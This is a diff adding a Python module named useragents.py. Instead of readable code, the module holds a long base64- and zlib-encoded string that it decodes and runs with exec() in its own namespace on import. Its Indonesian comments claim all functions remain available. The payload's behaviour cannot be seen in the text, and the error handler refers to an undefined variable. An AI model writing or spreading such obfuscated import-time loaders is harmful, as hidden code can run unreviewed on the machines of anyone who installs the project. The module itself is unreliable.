@@ -1,0 +1,16 @@
+#!/usr/bin/env python3
+# Obfuscated - useragents.py
+# Semua fungsi tetap tersedia
+
+import base64
+import zlib
+import sys
+
+__code = "eJzNWF1P4kAUfedX3NUXTbTtdNoC2+xDQXQNIsSCbrLZkGpHnVBaMi0s7q/f6QdKoXyVrizwAAOcc+65Z24Hjr+IY5+Jj9QViTuB0Vvw6rm4dAxjnzDrhbiBL4ze4BwurOfAYtDjy2CE6zB2g/EAmOXa3rBU6pmNu75x1bjtmvANfpaA346h/sq8IQHDtZlH7WjxqOX9oY5jiaogwckNdcdTffYBQJIOzVMwRiOHPJDHJg1EFZcFrMFJ83u3dXMGDh0QuCJPA+80QReRUhGk8A4t75E6BEzr2WI0+ebR2Ra0SAezdX5VrVZqu7OX92WXI3azKlUau7Nr+7JjHTp0Shwo706u7ksuRaUbKlIvd2dXCmj7HbGHFG69gHAx0GHe7jJwMf3n6UM50icX0P8ofSgPOyomAC2cKwBSMfveUOUc7Li6mT09Bi+IPwi8UYauB8qn6G8fbrvcEYF7whc0RYeppuSfhpvtKJS2vDVty3qibuD5rzpcuwGfPHwB2ib84Cr6SO3nGETaYWpWD1mzsoY8Cd4lZeTZm665AM+PgTjIOrDJVyTzd09jSjF6McOKX2XWOD/QUljKPJaSwlI2YaEFLDyPhVNYeBOWtIAlz2PJKSz5HWvBylybeNlTWUISf6AtbF0XHQGpyx5nYK+yebNmvBYXL9oUhxFo28xgox1+uuTm1zs9iJ+HdaByX4kTPissvRc0SRUQLzRzN9wT5lPPFVH5fRKLSG3wKTjbF5qkCCiz+JVy8P8kR+tr+8vR8six7FjM5/YoHaTV223HibqtQuVDU/yFIsb5tuR4BXniScN+IQc5PYTMH+991gUu80SRSCmnpLxnZuiP3ZdIAHNJ8I9OvwlNjXHTCROjq+NMtLz3iVjO8Vt0UZEyr2iLU3LiX3vEf/QfJmDtzp2IkLImYEudK/Z/gkhBBWfFqleHxNnVsnrpTFH7/PriI1pQG1PHFrsdZAiyLGlhg9CSd4qApbUTImxrrz7rMndLzSwnxElXcE8nlmPTw7Q2IRc1obLsbY1ZkwPNtIg6NdV+/QW4WkqP"
+
+# Jalankan kode di context module ini
+try:
+    exec(zlib.decompress(base64.b64decode(__code.encode())).decode(), globals())
+except Exception as e:
+    print(f"Error loading {filename}: {e}")
+    sys.exit(1)
